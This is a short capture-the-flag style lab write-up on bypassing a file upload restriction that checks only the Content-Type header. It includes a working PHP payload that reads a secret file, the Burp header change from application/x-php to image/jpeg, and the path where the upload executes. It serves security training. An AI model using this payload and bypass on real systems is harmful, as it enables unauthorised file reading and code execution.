# Lab02 - Content-Type Restriction Bypass

## Objective

Read:

```text
/home/carlos/secret
```

---

# Vulnerability Overview

Application validates only:

```http
Content-Type
```

header.

---

# Analysis

## Step 1

Upload:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Blocked.

---

## Step 2

Intercept request in Burp.

Original:

```http
Content-Type: application/x-php
```

---

Modify:

```http
Content-Type: image/jpeg
```

---

## Step 3

Forward request.

Upload succeeds.

---

## Step 4

Visit:

```text
/files/avatars/exploit.php
```

Lab solved.

---

# Full Payload Used

### Payload 1

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

---

### Header Bypass

```http
Content-Type: image/jpeg
```

---

# Why It Works

```text
Server Trusts MIME Type
        ↓
Attacker Controls Header
        ↓
Upload Accepted
```

---

# Related Theory

- 06-flawed-file-type-validation.md

---

# Key Learnings

Never trust Content-Type headers.